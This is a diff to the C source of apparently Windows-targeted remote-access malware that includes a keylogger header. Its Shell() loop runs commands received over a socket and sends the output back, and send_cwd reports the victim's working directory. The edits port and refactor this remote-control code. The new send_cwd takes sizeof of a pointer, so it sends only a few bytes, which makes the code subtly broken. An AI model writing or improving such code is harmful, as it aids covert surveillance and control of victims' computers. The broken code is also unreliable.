@@ -9,6 +9,7 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <direct.h> // _getcwd
 #include "keylogger.h"
 
 #define bzero(p, size) (void) memset((p), 0, (size))
@@ -119,16 +120,18 @@ char* get_system_info() {
 }
 
 void send_cwd() {
-    char cwd[256];
-    if (getcwd(cwd, sizeof(cwd)) == NULL) {
+    char *cwd = NULL;
+    //if (_getcwd(cwd, sizeof(cwd)) == NULL) {
+    if ( (cwd = _getcwd(NULL, 0)) == NULL) {
         perror("Error al obtener el directorio actual");
         return;
     }
-    cwd[strlen(cwd)] = '\0';
-    if (send(sock, cwd, sizeof(cwd), 0) < 0) {
-        perror("Error al enviar el directorio actual");
+    else {
+        if (send(sock, cwd, sizeof(cwd), 0) < 0) {
+            perror("Error al enviar el directorio actual");
+        }
     }
-
+    free(cwd);
     fflush(stdout); // Enviar datos de la secuencia de salida estándar de inmediato
 }
 
@@ -147,7 +150,6 @@ void Shell() {
     char buffer[MAX_BUFFER_SIZE];
     char container[MAX_BUFFER_SIZE];
     char total_response[18384];
-
     int buffer_pos = 0;
     int command_complete = 0;
 
@@ -181,6 +183,7 @@ void Shell() {
             if (buffer_pos >= MAX_BUFFER_SIZE && !command_complete) {
                 command_complete = 1; // Forzar finalización del comando incompleto
                 buffer_pos = 0; // Descartar el comando incompleto
+        
             }
         }
 
@@ -215,10 +218,12 @@ void Shell() {
             }
             send(sock, total_response, sizeof(total_response), 0);
         }
-
         // Restablecer variables para el siguiente comando
+        
         buffer_pos = 0;
         command_complete = 0;
+        
+        
     }
 }
 
